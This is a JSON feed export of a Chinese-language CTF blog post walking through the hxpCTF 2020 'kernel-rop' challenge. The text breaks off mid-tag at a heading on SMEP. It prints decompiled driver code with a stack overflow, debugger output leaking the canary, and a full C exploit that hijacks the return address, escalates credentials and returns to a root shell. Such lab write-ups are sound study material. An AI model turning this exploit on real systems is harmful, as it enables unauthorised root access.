{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog • All posts by \"ctf\" category",
    "description": "萌豚贴贴即是正义",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/09/29/hexp-2020-kernel-rop/",
            "url": "https://squirre17.github.io/2022/09/29/hexp-2020-kernel-rop/",
            "title": "hexp-2020-kernel-rop",
            "date_published": "2022-09-29T14:53:15.000Z",
            "content_html": "<p><a href=\"https://2020.ctf.link/\">Challenges</a><br>\nhxpCTF 2020 kernel-rop<br>\n 已经同步到 gittee</p>\n<p>先读取出 init 的文件系统</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gunzip initramfs.cpio.gz</span><br><span class=\"line\">mv vmlinuz vmlinux</span><br></pre></td></tr></table></figure>\n<p>设置 inittab 中 sh 权限为 root</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setuidgid 0000 sh</span><br></pre></td></tr></table></figure>\n<h1 id=\"hackmeso\"><a class=\"markdownIt-Anchor\" href=\"#hackmeso\">#</a> <a href=\"http://hackme.so\">hackme.so</a></h1>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">hackme_write</span><span class=\"params\">(file *f, <span class=\"type\">const</span> <span class=\"type\">char</span> *data, <span class=\"type\">size_t</span> size, <span class=\"type\">loff_t</span> *off)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> size_1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> tmp[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v8; <span class=\"comment\">// [rsp+80h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  size_1 = v4;</span><br><span class=\"line\">  v8 = __readgsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v4 &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    _warn_printk(<span class=\"string\">&quot;Buffer overflow detected (%d &lt; %lu)!\\n&quot;</span>, <span class=\"number\">4096LL</span>, v4);</span><br><span class=\"line\">    BUG();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  _check_object_size(hackme_buf, v4, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( copy_from_user(hackme_buf, data, size_1) )              [<span class=\"number\">1</span>] &lt;&lt;- 用户cp数据到 hackme_buf</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-14LL</span>;</span><br><span class=\"line\">  _memcpy(tmp, hackme_buf);                                    [<span class=\"number\">2</span>] &lt;&lt;- 溢出tmp</span><br><span class=\"line\">   <span class=\"keyword\">return</span> size_1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>再看 read</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">hackme_read</span><span class=\"params\">(file *f, <span class=\"type\">char</span> *data, <span class=\"type\">size_t</span> size, <span class=\"type\">loff_t</span> *off)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 size_1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> v6; <span class=\"comment\">// zf</span></span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> tmp[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v9; <span class=\"comment\">// [rsp+80h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__();</span><br><span class=\"line\">  size_1 = v4;</span><br><span class=\"line\">  v9 = __readgsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  _memcpy(hackme_buf, tmp);                    [<span class=\"number\">1</span>] &lt;&lt;- 注意 tmp下面就是canary 可以泄漏</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size_1 &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    _warn_printk(<span class=\"string\">&quot;Buffer overflow detected (%d &lt; %lu)!\\n&quot;</span>, <span class=\"number\">4096LL</span>, size_1);</span><br><span class=\"line\">    BUG();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  _check_object_size(hackme_buf, size_1, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">  v6 = copy_to_user(data, hackme_buf, size_1) == <span class=\"number\">0</span>;</span><br><span class=\"line\">  result = <span class=\"number\">-14LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v6 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> size_1;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"无smep-smap-kpti-kaslr\"><a class=\"markdownIt-Anchor\" href=\"#无smep-smap-kpti-kaslr\">#</a> 无 SMEP SMAP KPTI KASLR</h1>\n<p>removing  <code>+smep</code> ,  <code>+smap</code> ,  <code>kpti=1</code> ,  <code>kaslr</code>  and adding  <code>nopti</code> ,  <code>nokaslr</code> .</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/sh</span></span><br><span class=\"line\">qemu-system-x86_64 \\</span><br><span class=\"line\">    -m 256M \\</span><br><span class=\"line\">    -cpu kvm64 \\</span><br><span class=\"line\">    -kernel ./vmlinux \\</span><br><span class=\"line\">    -initrd ./initrd.modified.cpio \\</span><br><span class=\"line\">    -snapshot \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -monitor /dev/null \\</span><br><span class=\"line\">    -no-reboot \\</span><br><span class=\"line\">    -append &quot;console=ttyS0 nokpti quiet panic=1 nokaslr&quot; \\</span><br><span class=\"line\">    -s</span><br></pre></td></tr></table></figure>\n<p>canary 和 tmp 的距离如下 memcpy 不是 0 截断 rdx 是由 size 给到的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-00000000000000</span>A0 tmp             dd <span class=\"number\">32</span> dup(?)</span><br><span class=\"line\"><span class=\"number\">-0000000000000020</span> anonymous_0     dq ?</span><br></pre></td></tr></table></figure>\n<p>断到目标位置 截取 canary</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">●  <span class=\"number\">0xffffffffc0000046</span>                  mov    rax, QWORD PTR gs:<span class=\"number\">0x28</span></span><br><span class=\"line\"> → <span class=\"number\">0xffffffffc000004f</span>                  mov    QWORD PTR [rbp<span class=\"number\">-0x18</span>], rax</span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  p/x $rax</span><br><span class=\"line\">$<span class=\"number\">1</span> = <span class=\"number\">0xbced0c8930859900</span></span><br></pre></td></tr></table></figure>\n<p>泄漏出了 canary 后 查看 write 的汇编 和 useland 不同的是 这里弹了三个寄存器</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text.hackme_write:<span class=\"number\">00000000000000</span>A8                 pop     rbx</span><br><span class=\"line\">.text.hackme_write:<span class=\"number\">00000000000000</span>A9                 pop     r12</span><br><span class=\"line\">.text.hackme_write:<span class=\"number\">00000000000000</span>AB                 pop     rbp</span><br><span class=\"line\">.text.hackme_write:<span class=\"number\">00000000000000</span>AC                 retn</span><br></pre></td></tr></table></figure>\n<p>至于这个偏移可以打入特殊值断点调试<br>\n最终要调用 swapgs 和 iretq<br>\n 栈上要布局五个寄存器 (向下面这样)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROP[i++] = a[SWAPGS_POP_RET];</span><br><span class=\"line\">ROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">ROP[i++] = a[IRETQ];</span><br><span class=\"line\">ROP[i++] = (u64)getshell;</span><br><span class=\"line\">ROP[i++] = user_cs;</span><br><span class=\"line\">ROP[i++] = user_flags;</span><br><span class=\"line\">ROP[i++] = user_sp;</span><br><span class=\"line\">ROP[i++] = user_ss;</span><br></pre></td></tr></table></figure>\n<p>由于这题十分奇怪 各个操作的基址不停的在变化 所以需要通过别的途径来获取</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> write_addr, read_addr;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getOpAddr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;root get operation addr&quot;</span>);</span><br><span class=\"line\">    FILE * stream = popen(<span class=\"string\">&quot;cat /proc/kallsyms | grep hackme_write | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    assert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">    fread(buf, <span class=\"number\">0x10</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">    write_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;write_addr = 0x%lx&quot;</span>, write_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">    stream = popen(<span class=\"string\">&quot;cat /proc/kallsyms | grep hackme_read | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    assert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    fread(buf, <span class=\"number\">0x10</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">    read_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;read_addr = 0x%lx&quot;</span>, read_addr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  getOpAddr();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后栈溢出的操作比较简单</p>\n<ul>\n<li>劫持 rip 到用户函数 先 cc (pkc) 提权</li>\n<li>再跳转到 布局用户态寄存器 swapgs + iretq</li>\n<li>上述操作的时候可以劫持 rip 返回 getShell 函数</li>\n</ul>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> u64;</span><br><span class=\"line\"><span class=\"type\">int</span> fd;</span><br><span class=\"line\">u64 write_addr, read_addr;</span><br><span class=\"line\">u64 user_cs,user_ss,user_sp,user_rflags;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__ __volatile__ (</span><br><span class=\"line\">    <span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">open_dev</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  fd = open(<span class=\"string\">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;open_dev() failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;open_dev()&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// write to kernel</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">wtk</span><span class=\"params\">(<span class=\"type\">char</span> *buf, u64 size)</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;wtk start&quot;</span>);</span><br><span class=\"line\">  write(fd, buf, size);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;wtk&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// read from kernel</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">rfk</span><span class=\"params\">(<span class=\"type\">char</span> *buf, u64 size)</span>&#123;</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;rfk start&quot;</span>);</span><br><span class=\"line\">  read(fd, buf, size);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;rfk&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getOpAddr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;root get operation addr&quot;</span>);</span><br><span class=\"line\">    FILE * stream = popen(<span class=\"string\">&quot;cat /proc/kallsyms | grep hackme_write | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    assert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x20</span>];</span><br><span class=\"line\">    fread(buf, <span class=\"number\">0x10</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">    write_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;write_addr = 0x%lx&quot;</span>, write_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">    stream = popen(<span class=\"string\">&quot;cat /proc/kallsyms | grep hackme_read | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    assert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    fread(buf, <span class=\"number\">0x10</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">    read_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;read_addr = 0x%lx&quot;</span>, read_addr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;getOpAddr&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getShell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;get shell now&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;getShell failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 pkc = <span class=\"number\">0xffffffff814c67f0</span>;</span><br><span class=\"line\">u64 cc = <span class=\"number\">0xffffffff814c6410</span>;</span><br><span class=\"line\">u64 sh = (u64)getShell;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  (* (<span class=\"type\">int</span> *(*)(<span class=\"type\">void</span> *))cc)((* (<span class=\"type\">void</span> *(*)(<span class=\"type\">void</span> *))pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">  ret2usr();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">ret2usr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__(</span><br><span class=\"line\">    <span class=\"string\">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, user_ss;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, user_sp;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, user_rflags;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, user_cs;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, sh;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;swapgs;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;iretq;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;.att_syntax;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">0x80</span>];</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"string\">&#x27;\\xff&#x27;</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  wtk(buf, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = getRoot;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"增加smep\"><a 